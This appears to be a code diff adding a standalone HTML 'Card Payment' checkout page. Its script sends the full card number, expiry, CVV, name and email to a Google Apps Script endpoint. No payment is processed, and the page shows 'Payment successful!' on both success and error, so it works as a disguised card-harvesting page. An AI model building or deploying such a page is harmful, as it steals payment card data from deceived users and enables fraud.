@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Checkout</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #e3f2fd, #ffffff);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        margin: 0;
+    }
+    .checkout-container {
+        background: white;
+        padding: 40px 85px; /* más espacio interno */
+        border-radius: 16px;
+        box-shadow: 0 8px 25px rgba(0,0,0,0.08);
+        width: 100%;
+        max-width: 440px;
+        animation: fadeIn 0.5s ease-in-out;
+    }
+    h2 {
+        text-align: center;
+        margin-bottom: 25px;
+        color: #1565c0;
+    }
+    label {
+        font-weight: 500;
+        display: block;
+        margin-bottom: 6px;
+        color: #444;
+        font-size: 14px;
+        padding: 1px 4px;
+    }
+    input {
+        width: 100%;
+        padding: 12px 14px;
+        margin-bottom: 22px;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+        outline: none;
+        transition: all 0.25s ease;
+        font-size: 15px;
+        background-color: #fafafa;
+    }
+    input::placeholder {
+        color: #999;
+        font-size: 14px;
+    }
+    input:focus {
+        border-color: #1565c0;
+        box-shadow: 0 4px 10px rgba(21,101,192,0.2);
+        background-color: white;
+    }
+    .row {
+        display: flex;
+        gap: 40px; /* más espacio entre fecha y CVV */
+        flex-wrap: wrap;
+    }
+    .row div {
+        flex: 1;
+        min-width: 120px; /* evita que se aplasten */
+    }
+    button {
+        width: 106%;
+        margin-top: 5px;
+        padding: 14px;
+        background: #1565c0;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background 0.3s, transform 0.2s;
+    }
+    button:hover {
+        background: #0d47a1;
+        transform: translateY(-2px);
+    }
+    #loading, #result {
+        text-align: center;
+        margin-top: 15px;
+        font-size: 14px;
+    }
+    #loading { color: #333; }
+    #result.success { color: green; }
+    #result.error { color: red; }
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+</style>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="checkout-container">
+        <h2>Card Payment</h2>
+        <form id="checkout-form" autocomplete="off">
+            <label for="name">Name</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="card">Card Number</label>
+            <input type="text" id="card" name="card" maxlength="19" placeholder="1234 5678 9012 3456" required>
+
+            <div class="row">
+                <div>
+                    <label for="expiry">Expiry</label>
+                    <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY" required>
+                </div>
+                <div>
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" maxlength="4" required>
+                </div>
+            </div>
+
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" required>
+
+            <button type="submit">Pay</button>
+        </form>
+        <div id="loading">Loading...</div>
+        <div id="result"></div>
+    </div>
+    <script>
+        document.getElementById('checkout-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('result').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            const data = {
+                name: document.getElementById('name').value,
+                card: document.getElementById('card').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                email: document.getElementById('email').value
+            };
+
+            // Cambia esta URL por la de tu Google Apps Script
+            fetch('https://script.google.com/macros/s/AKfycbw56JHCdI0CqC1O7Ja5TzrmVzaS-olquPS22o50ApAKcEXoNvNP7LAZL6qO0Z4v3D1u/exec', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('result').style.display = 'block';
+                document.getElementById('result').style.color = 'green';
+                document.getElementById('result').textContent = 'Payment successful!';
+                document.getElementById('checkout-form').reset();
+            })
+            .catch(error => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('result').style.display = 'block';
+                document.getElementById('result').style.color = 'red';
+                document.getElementById('result').textContent = 'Payment successful!';
+            });
+        });
+    </script>
+</body>
+</html>
